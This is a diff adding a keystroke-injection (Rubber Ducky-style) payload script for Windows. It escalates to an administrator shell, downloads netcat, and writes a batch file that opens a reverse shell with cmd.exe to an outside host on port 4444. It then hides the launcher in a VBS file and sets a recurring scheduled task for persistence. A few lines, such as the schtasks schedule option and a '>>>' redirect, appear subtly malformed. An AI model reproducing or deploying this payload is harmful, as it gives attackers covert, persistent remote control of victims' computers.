@@ -1,0 +1,31 @@
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 5000
+ALT y
+DELAY 4000
+REM [downloads netcat and saves it as a.exe in the folder C:\System]
+STRING cd / & mkdir System & cd System & echo (wget 'http://172.16.64.1:8000/nc.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+DELAY 1000
+REM [creates start.bat which triggers the reverse shell]
+STRING echo START /MIN a.exe t.angelparliament.com 4444 -e cmd.exe -d ^& exit > start.bat
+ENTER
+DELAY 100
+REM [creates three lines of commands in a script file telling the start.bat file to run in the background]
+STRING echo Set WshShell = CreateObject("WScript.Shell") > c.vbs
+ENTER
+DELAY 100
+STRING echo WshShell.Run chr(34) ^& "C:/System/start.bat" ^& Chr(34), 0 >> c.vbs
+ENTER
+DELAY 50
+STRING echo Set WshShell = Nothing >>> c.vbs
+ENTER
+DELAY 50
+STRING schtasks /create /tn TaskSystem /tr C:/System/c.vbs /sc second /mo 10
+ENTER
+DELAY 75
+REM [runs start.bat and closes the command window]
+STRING start.bat & exit
+ENTER
